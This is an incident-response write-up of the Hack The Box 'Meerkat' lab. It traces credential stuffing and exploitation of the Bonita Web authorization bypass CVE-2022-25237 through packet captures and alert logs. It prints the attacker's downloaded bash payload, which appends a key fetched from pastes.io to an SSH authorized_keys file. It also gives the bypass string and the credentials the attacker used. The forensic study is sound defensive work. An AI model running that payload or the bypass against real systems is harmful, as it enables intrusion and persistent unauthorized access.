# Meerkat

**Platform:** Hack The Box

## Scenario:

As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren’t the most security aware. As our new security provider we’d like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.

## Tools used:

![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white)
![TShark](https://img.shields.io/badge/TShark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white)
![jq](https://img.shields.io/badge/jq-0769AD?style=for-the-badge&logo=jquery&logoColor=white)

## Skills learned:

- Threat Hunting
- Network & Log Analysis
- Incident Response
- Vulnerability Analysis
- Web Security
- Wireshark, TShark & jq
- Linux & Bash
- Digital Forensics
- MITRE ATT&CK
- OSINT

## Investigation process:

Searching through the logs of the file `meerkat-alerts.json` I noticed some alerts involving the words `EXPLOIT`, `Attempted Administrator Privilege Gain` and the CVE `2022-25237`. 

![Bonitasoft Bonita Web](./assets/01%20-%20bonita-soft-found.png)

A quick search of this CVE revealed this `CVE-2022-25237` is a critical authorization bypass vulnerability in `Bonitasoft Bonita Web (v2021.2)`. By appending a crafted string to the API URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions to deploy malicious code onto the server.

More information in https://nvd.nist.gov/vuln/detail/CVE-2022-25237

I used the `jq` tool to parse the json file by running this command `jq '.[].alert.signature' meerkat-alerts.json`. This command extracts the `signature` fields from each alert entry, this way confirming the exploitation of `Bonitasoft Bonita Web (v2021.2)`.

Continuing, I saw a lot of requests of the login type `POST /bonita/loginservice HTTP/1.1  (application/x-www-form-urlencoded)`.

![Bonitasoft logins](./assets/02%20-%20bonita-logins.png)

The credentials appear to be real corporate user accounts, suggesting they may have been obtained from prior breaches or credential leaks. This behavior is consistent with **Credential stuffing** attacks, where previously compromised credentials are reused to attempt authentication.

Checking the folowing packages, I discovered the string that was appended to the API URL path to bypass the authorization filter by the attacker's exploit: `i18ntranslation`.

![String attached to API](./assets/03%20-%20string-attached-to-api.png)

To check the usernames and passwords used by the attackers I used `tshark` running this command:

```sh
tshark -Y '(http.request.uri == "/bonita/loginservice") && (http.user_agent == "python-requests/2.28.1")' -r meerkat.pcap -T json | jq '.[]._source.layers.http."http.file_data"' | sort | uniq | wc -l
```

`-Y` to use filters from Wireshark

`-r` to read the pcap file

`-T` to convert the output to json

`|` to pipe the output into the jq tool

`.[]` iterates over each alert object, then the `_source` key, then `layers`, then `http` and finally the value inside the `file_data` key.

`sort` and `uniq`. These two commands extract only the unique entries.

`wc -l` to count the lines of the output, which returns 57. But, taking a look at the <a href="https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2022-25237/CVE-2022-25237.py#L57">exploit</a> we can see that it tries default credentials each time:

```py
bonita_default_user = "install"
bonita_default_password = "install"
```

We can confirm that by taking a look at the packets:

![Default credentials used](./assets/04%20-%20default-credentials.png)

One of the login attempts corresponds to default credentials used by the exploit script, which may skew the uniqueness count. The number of unique credential sets is `56`.

In order to know which username and password combination was successful, I applied this filter in Wireshark `http.request.uri == "/bonita/loginservice"`. Then I searched for the last packet and found out the credentials used: `seb.broom@forela.co.uk:g0vernm3nt`.

![Compromised credentials](./assets/05%20-%20credentials-found.png)

Following inspection of the HTTP stream showed the presence of `HTTP 204` responses, which indicates that the request was successfully processed, but no response body was returned. In contrast, `401` responses indicate failed authentication attempts. 

By checking in Statistics - HTTP - Requests in Wireshark, I was able to see the command used by the attacker and noticed the url `pastes.io`, used by the attacker to download a payload.

![pastes.io URL](./assets/06%20-%20url%20found.png)

Opening the `https://pastes.io/raw/bx5gcr0et8`, I found this:

```sh
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

I saw that the attacker is copying the content of the file `hffgra4unv` into the `authorized_keys` file, used by the attacker to gain persistence on the host.

`/home/ubuntu/.ssh/authorized_keys` is the route of the file modified to gain access.

A quick search showed that `T1098.004` corresponds to a **MITRE ATT&CK** technique used for persistence by modifying SSH authorized_keys.

- T1098: Account manipulation.
- T1098.004: SSH authorized_keys. Used for persistence by adding authorized SSH keys to user accounts.

## Indicators of Compromise:

- Malicious domain: `pastes.io`
- Malicious URL: `/bonita/API/pageupload/i18ntranslation`
- User compromised: `seb.broom@forela.co.uk`
- CVE exploited: `2022-25237`

## Attack chain diagram:

Credential stuffing => Valid authentication => CVE-2022-25237 exploitation => Payload download => SSH persistence.

## Impact:

The attacker successfully obtained valid credentials, achieved authenticated access to the Bonita platform and leveraged a known vulnerability to perform unauthorized API actions. Persistence was established via SSH authorized key modification, indicating a high-risk compromise with potential for full system control.

## Recommendations:

- Disable `seb.broom@forela.co.uk` user account.
- Reset affected credentials and enforce password rotation for accounts involved in suspicious activity.
- Patch systems against the `CVE-2022-25237`
- Monitor outbound traffic for suspicious `GET` requests.

## Conclusion:

The attacker used likely stolen credentials to gain access by exploiting a known vulnerability in `Bonitasoft Bonita Web (v2021.2)`.